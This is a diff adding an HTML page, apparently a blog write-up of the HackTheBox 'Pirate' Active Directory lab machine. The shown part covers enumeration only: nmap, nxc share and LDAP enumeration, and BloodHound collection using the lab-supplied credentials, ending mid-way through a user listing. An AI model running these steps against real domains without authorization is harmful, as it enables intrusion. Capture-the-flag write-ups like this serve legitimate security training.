@@ -1,0 +1,663 @@
+
+<!DOCTYPE html>
+<html lang="it">
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>HTB - Season10 - Writeups - Pirate</title>
+   <link rel="stylesheet" href="/static/style.css">
+   <link rel="shortcut icon" href="/static/images/favicon.png" type="image/x-icon">
+</head>
+<body>
+   <canvas class="matrix-bg" id="matrix"></canvas>
+
+   <header>
+      <div class="header-content">
+         <div class="terminal-prompt">k0d14k@kali:~#</div>
+         <div class="img-text">
+               <img src="/static/images/avatar.png" width="100rem">
+               <div class="text">
+                  <h1>Luca Puzzoni<span class="typing-cursor">_</span></h1>
+                  <p class="subtitle">Softwate Security Consultant | Hacker | Full Stack Web Developer</p>
+               </div>
+         </div>
+      </div>
+   </header>
+
+   <nav>
+      <ul>
+         <li><a href="/">Home</a></li>
+         <li><a href="/#about">Whoami</a></li>
+         <li><a href="/#skills">Skills</a></li>
+         <li><a href="/#projects">Projects</a></li>
+         <li><a href="/#contact">Contacts</a></li>
+      </ul>
+   </nav>
+
+   <button id="backToTop">↑</button>
+
+   <main style="text-align: justify;">     
+      <img src="images/pirate.png" alt="500rem">   
+      <h1>Pirate - HTB Season 10</h1>
+
+      <p>
+         <b>Categories</b>: #active-directory, #ReadGMSAPassword, #RBCD, #ntlmrelay, #coercion, #ldaps, #ForceChangePassword, #WriteSPN, #SPN-Jacking
+      </p>
+
+      <hr>
+
+      <section id="index">
+         <h2>ls -l index</h2>
+         <div class="project">
+               <!--USED BY THE LISTER-->
+               <span id="time" hidden>26 Apr 14 01:10</span>
+         </div>
+      </section>      
+
+      <section id="enumeration">
+         <h2>cat enumeration</h2>
+         <p>HackTheBox provides the following credentials for access:</p>
+         <div class="code">pentest:p3nt3st2025!&</div>
+
+         <h3>TCP Scan</h3>
+         <div class="code">
+            # Nmap 7.95 scan initiated Fri Apr 10 12:41:23 2026 as: nmap -sS -sC -sV -v -oN tcp-scan.txt 10.129.35.174 <br>
+            Nmap scan report for 10.129.35.174 <br>
+            Host is up (0.051s latency). <br>
+            Not shown: 985 filtered tcp ports (no-response) <br>
+            PORT     STATE SERVICE       VERSION <br>
+            53/tcp   open  domain        Simple DNS Plus <br>
+            80/tcp   open  http          Microsoft IIS httpd 10.0 <br>
+            |_http-server-header: Microsoft-IIS/10.0 <br>
+            | http-methods:  <br>
+            |   Supported Methods: OPTIONS TRACE GET HEAD POST <br>
+            |_  Potentially risky methods: TRACE <br>
+            |_http-title: IIS Windows Server <br>
+            88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-10 17:41:35Z) <br>
+            135/tcp  open  msrpc         Microsoft Windows RPC <br>
+            139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn <br>
+            389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name) <br>
+            | ssl-cert: Subject: commonName=DC01.pirate.htb <br>
+            | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb <br>
+            | Issuer: commonName=pirate-DC01-CA <br>
+            | Public Key type: rsa <br>
+            | Public Key bits: 2048 <br>
+            | Signature Algorithm: sha256WithRSAEncryption <br>
+            | Not valid before: 2025-06-09T14:05:15 <br>
+            | Not valid after:  2026-06-09T14:05:15 <br>
+            | MD5:   5c8e:b331:ef90:890a:d8e3:feaa:b53c:2910 <br>
+            |_SHA-1: 0128:c655:2aed:c190:efff:d3eb:a2fb:034b:fa86:ab69 <br>
+            |_ssl-date: 2026-04-10T17:42:56+00:00; +7h00m00s from scanner time. <br>
+            443/tcp  open  https? <br>
+            445/tcp  open  microsoft-ds? <br>
+            464/tcp  open  kpasswd5? <br>
+            593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 <br>
+            636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name) <br>
+            |_ssl-date: 2026-04-10T17:42:56+00:00; +7h00m00s from scanner time. <br>
+            | ssl-cert: Subject: commonName=DC01.pirate.htb <br>
+            | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb <br>
+            | Issuer: commonName=pirate-DC01-CA <br>
+            | Public Key type: rsa <br>
+            | Public Key bits: 2048 <br>
+            | Signature Algorithm: sha256WithRSAEncryption <br>
+            | Not valid before: 2025-06-09T14:05:15 <br>
+            | Not valid after:  2026-06-09T14:05:15 <br>
+            | MD5:   5c8e:b331:ef90:890a:d8e3:feaa:b53c:2910 <br>
+            |_SHA-1: 0128:c655:2aed:c190:efff:d3eb:a2fb:034b:fa86:ab69 <br>
+            2179/tcp open  vmrdp? <br>
+            3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name) <br>
+            |_ssl-date: 2026-04-10T17:42:56+00:00; +7h00m00s from scanner time. <br>
+            | ssl-cert: Subject: commonName=DC01.pirate.htb <br>
+            | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb <br>
+            | Issuer: commonName=pirate-DC01-CA <br>
+            | Public Key type: rsa <br>
+            | Public Key bits: 2048 <br>
+            | Signature Algorithm: sha256WithRSAEncryption <br>
+            | Not valid before: 2025-06-09T14:05:15 <br>
+            | Not valid after:  2026-06-09T14:05:15 <br>
+            | MD5:   5c8e:b331:ef90:890a:d8e3:feaa:b53c:2910 <br>
+            |_SHA-1: 0128:c655:2aed:c190:efff:d3eb:a2fb:034b:fa86:ab69 <br>
+            3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name) <br>
+            | ssl-cert: Subject: commonName=DC01.pirate.htb <br>
+            | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb <br>
+            | Issuer: commonName=pirate-DC01-CA <br>
+            | Public Key type: rsa <br>
+            | Public Key bits: 2048 <br>
+            | Signature Algorithm: sha256WithRSAEncryption <br>
+            | Not valid before: 2025-06-09T14:05:15 <br>
+            | Not valid after:  2026-06-09T14:05:15 <br>
+            | MD5:   5c8e:b331:ef90:890a:d8e3:feaa:b53c:2910 <br>
+            |_SHA-1: 0128:c655:2aed:c190:efff:d3eb:a2fb:034b:fa86:ab69 <br>
+            |_ssl-date: 2026-04-10T17:42:56+00:00; +7h00m00s from scanner time. <br>
+            5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) <br>
+            |_http-title: Not Found <br>
+            |_http-server-header: Microsoft-HTTPAPI/2.0 <br>
+            Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows <br>
+            <br>
+            Host script results: <br>
+            | smb2-time:  <br>
+            |   date: 2026-04-10T17:42:18 <br>
+            |_  start_date: N/A <br>
+            | smb2-security-mode:  <br>
+            |   3:1:1:  <br>
+            |_    Message signing enabled and required <br>
+            |_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s <br>
+            <br>
+            Read data files from: /usr/bin/../share/nmap <br>
+            Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . <br>
+            # Nmap done at Fri Apr 10 12:42:56 2026 -- 1 IP address (1 host up) scanned in 93.06 seconds <br>
+         </div>
+
+         <p>
+            The nmap scan reveals that the target host is the Domain Controller of the <span class="highlight">pirate.htb</span> domain. Beyond the standard 
+            ports of a typical Domain Controller, additional ports are present. I pay particular attention to:
+         </p>
+
+         <ul>
+            <li>80 HTTP</li>
+            <li>135 RPC</li>
+         </ul>
+         
+         <h3>Share Enumeration</h3>
+
+         <div class="code">
+            k0d14k@kpb:~/Documenti/pirate$ nxc smb 10.129.35.174 -u pentest -p 'p3nt3st2025!&' --shares <br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.35.174&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True) <br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.35.174&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] pirate.htb\pentest:p3nt3st2025!&&nbsp;&nbsp;<br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.35.174&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Enumerated shares <br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.35.174&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Share&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Permissions&nbsp;&nbsp;&nbsp;&nbsp; Remark <br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.35.174&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----------&nbsp;&nbsp;&nbsp;&nbsp; ------ <br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.35.174&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ADMIN$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remote Admin <br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.35.174&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; C$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Default share <br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.35.174&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IPC$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;READ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remote IPC <br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.35.174&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NETLOGON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;READ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Logon server share&nbsp;&nbsp;<br>
+            SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.35.174&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SYSVOL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;READ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Logon server share 
+         </div>
+
+         <p>
+            Using <span class="highlight">nxc</span> and the credentials provided by <span class="highlight">HackTheBox</span>, I enumerate permissions on 
+            the shares exposed by the system. Inside <span class="highlight">SYSVOL</span> I find some Policies, but they don't appear to be useful at this stage.
+         </p>
+
+         <h3>Bloodhound Enumeration</h3>
+         <p>Using the <span class="highlight">nxc</span> ingestor I extract the JSON collections zip and import it into Bloodhound:</p>
+
+         <div class="code">
+            k0d14k@kpb:~/Documenti/pirate/enum$ nxc ldap 10.129.35.174 -u pentest -p 'p3nt3st2025!&' --bloodhound -c all --dns-server 10.129.35.174 <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)  <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] pirate.htb\pentest:p3nt3st2025!&  <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Resolved collection methods: acl, adcs, container, dcom, group, localadmin, loggedon, objectprops, psremote, rdp, session, trusts <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Excluded collection methods:  <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Bloodhound data collection completed in 0M 23S <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Collecting ADCS data (CertiHound)... <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Found 34 certificate templates <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Found 1 Enterprise CAs <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Compressing output into /home/k0d14k/.nxc/logs/DC01_10.129.35.174_2026-04-10_205658_bloodhound.zip
+         </div>
+
+         <p>Once inside Bloodhound I analyze the entities looking for anything of interest. We are starting as the <span class="highlight">pentest</span> user.</p>
+
+         <p>For convenience I also export the list of users and computers. For each element I consider relevant, I check Bloodhound for potential attack paths:</p>
+
+         <div class="code">
+            k0d14k@kpb:~/Documenti/pirate/enum$ nxc ldap 10.129.35.174 -u pentest -p 'p3nt3st2025!&' --dns-server 10.129.35.174 --users --computers <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)&nbsp;&nbsp;<br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] pirate.htb\pentest:p3nt3st2025!&&nbsp;&nbsp;<br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Enumerated 7 domain users: pirate.htb <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -Username-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-Last PW Set-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -BadPW-&nbsp;&nbsp;-Description-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Administrator&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2025-06-08 16:32:36 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Built-in account for administering the computer/domain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Guest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <never>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Built-in account for guest access to the computer/domain&nbsp;&nbsp;&nbsp;&nbsp; <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; krbtgt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2025-06-08 16:40:29 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Key Distribution Center Service Account&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a.white_adm&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2026-01-16 01:36:34 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a.white&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2025-06-08 21:33:01 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pentest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2025-06-09 15:40:23 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; j.sparrow&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2025-06-09 17:08:44 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
